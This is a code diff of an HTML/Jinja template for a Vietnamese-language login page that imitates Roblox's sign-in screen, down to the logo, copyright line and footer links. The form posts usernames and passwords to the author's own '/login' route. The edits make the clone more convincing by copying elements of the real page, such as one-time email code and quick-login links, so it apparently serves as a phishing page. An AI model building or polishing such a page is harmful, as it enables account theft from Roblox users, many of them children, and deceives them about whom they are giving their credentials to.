@@ -5,13 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Đăng nhập – Roblox</title>
     <style>
-        /* ===== RESET & FONT ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
-        }
+        /* ===== RESET ===== */
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', 'Roboto', Arial, sans-serif; }
         body {
             background: #1a1a2e;
             display: flex;
@@ -19,20 +14,16 @@
             align-items: center;
             min-height: 100vh;
             padding: 20px;
-            margin: 0;
         }
-        /* ===== KHUNG ĐĂNG NHẬP ===== */
         .login-box {
             background: #ffffff;
             max-width: 420px;
             width: 100%;
-            padding: 40px 35px;
+            padding: 40px 35px 30px;
             border-radius: 16px;
             box-shadow: 0 12px 40px rgba(0,0,0,0.6);
             text-align: center;
-            transition: 0.3s;
         }
-        /* ===== LOGO ROBLOX ===== */
         .logo {
             font-size: 38px;
             font-weight: 900;
@@ -40,25 +31,21 @@
             margin-bottom: 4px;
             letter-spacing: -0.5px;
         }
-        .logo span {
-            color: #e03a3a;
-        }
+        .logo span { color: #e03a3a; }
         .subtitle {
             color: #666;
             font-size: 15px;
-            margin-bottom: 28px;
-            font-weight: 400;
+            margin-bottom: 25px;
         }
-        /* ===== INPUT GROUP ===== */
         .input-group {
-            margin-bottom: 18px;
             text-align: left;
+            margin-bottom: 18px;
         }
         .input-group label {
+            display: block;
             font-size: 14px;
             font-weight: 600;
             color: #333;
-            display: block;
             margin-bottom: 5px;
         }
         .input-group input {
@@ -76,7 +63,6 @@
             background: #fff;
             box-shadow: 0 0 0 3px rgba(0,112,209,0.15);
         }
-        /* ===== NÚT ĐĂNG NHẬP ===== */
         .btn-login {
             width: 100%;
             padding: 14px;
@@ -90,42 +76,43 @@
             transition: 0.2s;
             margin-top: 6px;
         }
-        .btn-login:hover {
-            background: #005bb5;
-        }
-        .btn-login:active {
-            transform: scale(0.97);
-        }
-        /* ===== LINK PHỤ ===== */
-        .footer-links {
-            margin-top: 22px;
-            font-size: 13px;
-            color: #555;
-        }
-        .footer-links a {
-            color: #0070d1;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-        .footer-links .divider {
-            color: #ccc;
-            margin: 0 6px;
-        }
-        /* ===== THÔNG BÁO LỖI ===== */
+        .btn-login:hover { background: #005bb5; }
+        .btn-login:active { transform: scale(0.97); }
         .error-msg {
             color: #d32f2f;
             font-size: 13px;
-            margin-top: 8px;
-            display: none;
+            margin: 8px 0 0;
+            display: block;
             text-align: left;
             background: #ffebee;
             padding: 8px 12px;
             border-radius: 6px;
         }
-        /* ===== COPYRIGHT ===== */
+        .links {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #555;
+        }
+        .links a {
+            color: #0070d1;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .links a:hover { text-decoration: underline; }
+        .links .divider { color: #ccc; margin: 0 5px; }
+        .links .row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+            flex-wrap: wrap;
+        }
+        .quick-login {
+            margin-top: 12px;
+            border-top: 1px solid #eee;
+            padding-top: 14px;
+            font-size: 13px;
+        }
+        .quick-login a { color: #0070d1; text-decoration: none; font-weight: 500; }
         .copyright {
             margin-top: 24px;
             font-size: 12px;
@@ -133,77 +120,68 @@
             border-top: 1px solid #eee;
             padding-top: 16px;
         }
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 480px) {
-            .login-box { padding: 30px 20px; }
-            .logo { font-size: 30px; }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px 16px;
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
         }
+        .footer-links a { color: #888; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
-
     <div class="login-box">
-        <!-- Logo -->
         <div class="logo">R<span>o</span>blox</div>
         <div class="subtitle">Đăng nhập để tiếp tục</div>
 
-        <!-- Form đăng nhập -->
-        <form action="/login" method="POST" id="loginForm">
+        <form action="/login" method="POST">
             <div class="input-group">
-                <label for="username">Tên đăng nhập / Email</label>
-                <input type="text" id="username" name="username" placeholder="Nhập tên đăng nhập hoặc email" required autofocus>
+                <label for="username">Tên người dùng/Địa chỉ email/Số điện thoại</label>
+                <input type="text" id="username" name="username" placeholder="Nhập tên người dùng hoặc email" required autofocus>
             </div>
             <div class="input-group">
                 <label for="password">Mật khẩu</label>
                 <input type="password" id="password" name="password" placeholder="Nhập mật khẩu" required>
             </div>
 
-            <div id="errorDisplay" class="error-msg">⚠️ Sai tài khoản hoặc mật khẩu. Vui lòng thử lại.</div>
+            {% if error %}
+            <div class="error-msg">{{ error }}</div>
+            {% endif %}
 
             <button type="submit" class="btn-login">Đăng nhập</button>
         </form>
 
-        <!-- Link phụ -->
-        <div class="footer-links">
-            <a href="#">Quên mật khẩu?</a>
-            <span class="divider">•</span>
-            <a href="#">Đăng ký</a>
+        <div class="links">
+            <div class="row">
+                <a href="#">Bạn quên Mật khẩu hoặc Tên người dùng?</a>
+                <a href="#">Gửi mã một lần cho tôi qua email</a>
+            </div>
         </div>
 
-        <div class="copyright">© 2026 Roblox Corporation</div>
+        <div class="quick-login">
+            <a href="#">Đăng nhập nhanh</a>
+        </div>
+
+        <div style="margin-top: 16px; font-size: 14px; color: #333;">
+            Bạn không có tài khoản? <a href="#" style="color:#0070d1; font-weight:600; text-decoration:none;">Đăng ký</a>
+        </div>
+
+        <div class="copyright">
+            <div class="footer-links">
+                <a href="#">Đăng ký</a>
+                <a href="#">Về chúng tôi</a>
+                <a href="#">Việc làm</a>
+                <a href="#">Trung tâm tin tức</a>
+                <a href="#">Cha mẹ</a>
+                <a href="#">Mua thẻ quà tặng</a>
+                <a href="#">Trợ giúp</a>
+            </div>
+            <div style="margin-top: 10px;">© 2026 Roblox Corporation</div>
+        </div>
     </div>
-
-    <script>
-        // ===== MÔ PHỎNG LỖI ĐĂNG NHẬP =====
-        const form = document.getElementById('loginForm');
-        const errorDisplay = document.getElementById('errorDisplay');
-        const username = document.getElementById('username');
-        const password = document.getElementById('password');
-
-        form.addEventListener('submit', function(e) {
-            const user = username.value.trim();
-            const pass = password.value.trim();
-
-            if (!user || !pass) {
-                e.preventDefault();
-                errorDisplay.style.display = 'block';
-                errorDisplay.textContent = '⚠️ Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu.';
-                return;
-            }
-
-            // Nếu đã nhập đủ, cho phép submit (dữ liệu sẽ gửi về server)
-            // Không hiển thị lỗi
-            errorDisplay.style.display = 'none';
-        });
-
-        // Ẩn lỗi khi người dùng bắt đầu nhập
-        username.addEventListener('input', function() {
-            errorDisplay.style.display = 'none';
-        });
-        password.addEventListener('input', function() {
-            errorDisplay.style.display = 'none';
-        });
-    </script>
-
 </body>
-  </html>
+    </html>
